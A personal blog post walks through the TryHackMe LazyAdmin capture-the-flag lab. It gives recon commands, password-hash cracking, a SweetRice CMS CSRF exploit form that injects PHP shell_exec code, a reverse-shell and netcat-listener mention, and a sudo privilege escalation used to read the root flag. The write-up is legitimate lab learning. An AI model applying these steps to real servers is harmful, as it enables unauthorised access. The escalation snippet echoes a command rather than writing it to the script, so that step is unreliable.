I recently re-sparked my interest for InfoSec and started dabbling with a couple of hacking platforms and war games and stumbled over [TryhackMe](https://www.tryhackme.com), which so far has been an absolutely fantastic learning resource for information security.

This post marks my first CTF write up, so if you stumble over this, keep this in mind and if you have suggestions for improving the flow of the post, or the general content, feel free to send me en email about that!

With all of that out of the way, let's jump into the [LazyAdmin](https://tryhackme.com/room/lazyadmin) CTF on TryHackMe.

## Lazy Admin

To start off, we'll use `nmap` to find out which ports are running:

```bash
nmap  -vv -sV -sC <IP> -A -T4
```

We get the ports 22 and 80. Next, let's try to navigate to the website on port 80. There we see the basic Apache welcome page.

To see what else is running on this web server, let's use `gobuster` to find other files and directories

```bash
gobuster -u http://<IP>/ -w /opt/SecLists/Discovery/Web-Content/big.txt -x "php,txt,html"
```

This uses the [SecLists](https://github.com/danielmiessler/SecLists) repo's `Web-Content/big.txt` wordlist and we'll initially try for .php, .txt and .html files.

The first run gives us the `/content` folder and if we navigate there in our browser, we see an in-progress SweetRice CMS page.

At this point, it makes sense to go to [Exploit DB](https://www.exploit-db.com/) and search for SweetRice. There are several interesting CVE's, but we don't know the version yet.

Let's run `gobuster` again, to find resources inside of `content`:

```bash
gobuster -u http://<IP>/content/ -w /opt/SecLists/Discovery/Web-Content/big.txt -x "php,txt,html"
```

This gives us several things, such as the `/as` folder and the `/inc` folder. Under `/as` we find an administrator login, which is what we were looking for. Inside the `/inc` folder, interestingly, we find MySQL backup, which we immediately download.

Also, there are license.txt and changelog files and folders, which provide us with some info about the version - we're dealing with 1.5.0, so we can use the latest exploits on Exploit-DB!

Opening the downloaded MySQL backup, we stumble upon the password and the user name.

We can use `john the ripper` to crack the password, which looks like MD5:

```bash
john pw.txt --wordlist=/opt/SecLists/Passwords/Leaked-Databases/rockyou.txt --format=RAW-MD5
```

We use the `rockyou` password list and immediately get the resulting password.

With that, we can login to the Admin page! Nice.

Next, let's check out the exploits at Exploit DB. There, we find [this](https://www.exploit-db.com/exploits/40700) exploit, which enables us to do PHP code execution via a CSRF bug.

This sounds promising, as with remote code execution, we should be able to read out the user and root flag from the server, or simply open a reverse shell, letting us basically connect to the server via ssh.

If we look at the exploit on Exploit-DB, it looks like the following:

```php
<html>
    <body onload="document.exploit.submit();">
        <form action="http://<IP>/content/as/?type=ad&mode=save" method="POST" name="exploit">
            <input type="hidden" name="adk" value="hacked"/>
            <textarea type="hidden" name="adv">
                ... add php code here ...
            </textarea>;
        </form>
    </body>
</html>
```

We create a new .html file and paste this code in. However, instead of the `Hacked` message, we can use the `shell_exec` method to execute shell commands on the server, so we replace it with:

```php
$output = shell_exec('ls /home');
echo "<pre>$output</pre>";
```

This directs us to the Ads page in the SweetRice backend, with a new ad active. If we now access this using `http://<IP>/content/inc/ads/hacked.php` in this case, then we see the executed PHP code, which shows us the contents of `/home`.

This way, we can see that the username is `itguy`. Next we can `ls /home/itguy` to see the files inside of the user's folder. There, we can already get the user flag using `cat /home/itguy/user.txt`.

With this exploit, we could also execute a [reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php), which together with a locally opened netcat session (`nc -lvnp 4444`) enables us to gain access to the server.

In this case, we'll just continue to execute commands using the exploit though. The next thing we need to do is to privilege-escalate. We execute `sudo -l` and see, that the `www-data` user, which is the user running the web app, can execute the `backup.pl` file.

Next, we can look at the file using `cat /home/itguy/backup.pl` and we see that it simply calls `/etc/copy.sh`, which is a file we have access to. Now we have a way to get to the root flag - we overwrite the `/etc/copy.sh` file with a script for reading out the `/root/root.txt` file and we can do all of that in our CSRF exploit:

```php
echo "<pre>$output</pre>";
$output1 = shell_exec('echo "cat /root/root.txt > /etc/copy.sh"');
echo "<pre>$output1</pre>";
$output2 = shell_exec('sudo /usr/bin/perl /home/itguy/backup.pl');
echo "<pre>$output2</pre>";
```

When we execute the exploit again, we get the root flag.

All Done!

## Conclusion

What a nice entry-level CTF and one of the first unguided ones I was able to, after going through almost all entry-level THM rooms mentioned [here](https://blog.tryhackme.com/free_path/) before, finish without looking at any writeups, or any external help myself!

#### Resources

* [TryHackMe LazyAdmin](https://tryhackme.com/room/lazyadmin)
